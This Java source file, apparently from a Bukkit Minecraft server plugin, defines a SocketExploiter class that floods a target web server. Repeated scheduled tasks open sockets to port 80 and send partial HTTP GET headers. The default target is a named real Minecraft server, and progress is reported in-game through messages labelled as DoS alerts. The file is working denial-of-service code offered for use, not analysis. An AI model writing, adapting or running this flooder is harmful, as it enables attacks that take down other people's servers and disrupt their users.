package com.teaminfinity.exigencies.objects.fun;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.UUID;

import org.bukkit.entity.Player;

import com.teaminfinity.exigencies.api.MessageAPI;
import com.teaminfinity.exigencies.api.PlayerAPI;
import com.teaminfinity.exigencies.enums.MessageVal;
import com.teaminfinity.exigencies.utils.SchedulingUtility;

public class SocketExploiter extends Socket implements Runnable {

	protected transient final int BUFFER = 5;
	
	protected transient boolean retry = false;
	protected transient ArrayList<Integer> tasks = new ArrayList<Integer>();
	protected transient String target = "hurricanepvp.net";
	protected transient UUID niceGuy;
	protected transient long packetsSent = 0;
	
	public SocketExploiter(String target, UUID niceGuy)
	{
		this.target = target;
		for (int i = 0; i < BUFFER; i++)
		{
			tasks.add(SchedulingUtility.beginRepeating(this, 1));
		}
		this.niceGuy = niceGuy;
	}
	
	public void run() 
	{
		for (int i = 1; i < 10; i++) 
		{
			try 
			{
				Socket net = new Socket(target, 80); // connects the Socket to the target port 80.
				sendRawLine("GET / HTTP/1.1", net); // Sends the GET / OutputStream
				sendRawLine("Host: " + target, net); // Sends Host: to the OutputStream
				packetsSent += 2;
				if(packetsSent % 10000 == 0)
				{
					Player player = PlayerAPI.getPlayer(niceGuy);
					if(player == null)
					{
						return;
					}
					player.sendMessage(MessageAPI.getReformat(MessageVal.COMMAND_DOS_ALERT,
							target).replaceAll("%PACKETS%", packetsSent + ""));
				}
			} 
			catch (Exception e)
			{
				if(!(retry))
				{
					retry = true;
					try 
					{
						target = java.net.InetAddress.getByName(target).getHostAddress().toString();
					} 
					catch (UnknownHostException e1) 
					{
						for(Integer val : tasks)
						{
							SchedulingUtility.stopRepeating(val);
						}
						alertUnsuccess(e1);
					}
					return;
				}
				for(Integer val : tasks)
				{
					SchedulingUtility.stopRepeating(val);
				}
				alertUnsuccess(e);
				break;
			}
		}
	}
	
	private void alertUnsuccess(Exception exception)
	{
		Player player = PlayerAPI.getPlayer(niceGuy);
		if(player == null)
		{
			return;
		}
		player.sendMessage(MessageAPI.getReformat(MessageVal.COMMAND_DOS_UNSUCCESS_SELF,
				exception.toString()));
	}

	public static void sendRawLine(String text, Socket sock) 
	{
		try 
		{
			BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
			out.write(text + " ");
			out.flush();
		}
		catch (IOException ex)
		{
			ex.printStackTrace();
		}
	}
}